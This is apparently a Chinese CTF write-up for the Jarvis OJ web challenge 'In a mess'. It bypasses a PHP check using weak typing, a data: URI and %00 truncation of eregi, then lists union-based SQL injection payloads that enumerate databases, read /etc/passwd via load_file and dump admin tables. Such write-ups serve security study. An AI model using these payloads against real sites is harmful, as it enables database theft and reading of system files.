Jarvisoj Web In a mess(500) writeup

过检测

由源代码提示

<!--index.phps-->work harder!harder!harder!

http://web.jarvisoj.com:32780/index.phps

通过分析,要构造三个a,b,id参数
id: 用弱类型就可以了

id=0a

a: 要从file_get_contents得到一个”1112 is a nice lab!”,这里通过php的伪协议,post一个字符串的data就可以了

a=php://input
postdata: 1112 is a nice lab!
测试后不太行:
这里用data协议
a=data:,1112 is a nice lab!

b: 要求字符串大于5,还要满足eregi函数的限制,第一个参数不能等于4,这里eregi函数可以用%00截断

eregi函数: eregi(string pattern, string string, [array regs]);
如果string字符串符合Pattern模式,就返回true

%00截断: 遇到%00则默认为字符串的结束,由于是一个字符一个字符的比较的,所以到了%00,eregi函数就以为比较完成了,这样就避免了第四个字符串要求是4而又不能是4的条件
eregi("111".substr($b,0,1),"1114")

"111".substr($b,0,1)
将111字符串和b的第一个字符拼接

$b = %0011111; 满足条件字符串长度大于5即可

最终参数: ?id=0e&a=data:,1112 is a nice lab!&b=%0011111

<?php

error_reporting(0);
echo "<!--index.phps-->";

if(!$_GET['id'])
{
    header('Location: index.php?id=1');
    exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
    echo 'Hahahahahaha';
    return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
    require("flag.txt");
}
else
{
    print "work harder!harder!harder!";
}

?>

构造union查询语句

1. 猜测目标网页/表单的查询数
2. 查询目标数据库的基础信息
    版本信息、用户信息、系统表信息
3. 通过系统表查找敏感数据表
    user、admin、root、password
4. 查询目标数据表的数据内容
  • 爆字段数
'union select 1, --'
'union select 1,2 --'
'union select 1,2,3 --'
'union select null --'
'union select null,null --'
'union select null,null,null --'
  • 爆库
'and 1=2 union select schema_name from information_schema.schemata'
'and 1=2 union select database()'
'and 1=2 union select 1,2,table_name from information_schema.tables--'
'and 1=2 union select 1,version(),database() from information_schema.tables--'
'and 1=2 union select 1,user(),database() from information_schema.tables--'
'and 1=2 union select 1,load_file('/etc/passwd'),database() from information_schema.tables--'
information_schema提供了访问数据库元数据的方式,元数据包括例如数据库名、表名、列数据类型、访问权限、字符集等基础信息
  • 爆表
and 1=2 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=0x库名
  • 爆字段
'and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=0x表'

'and 1=2 union select 1,2,group_concat(column_name) from 表名'

'and 1=2 union select 1,2,GRANTEE from USER_PRIVILEGES'
  • 爆字段内容
'and 1=2 union select 1,2,group_concat(id,context,title) from admin'
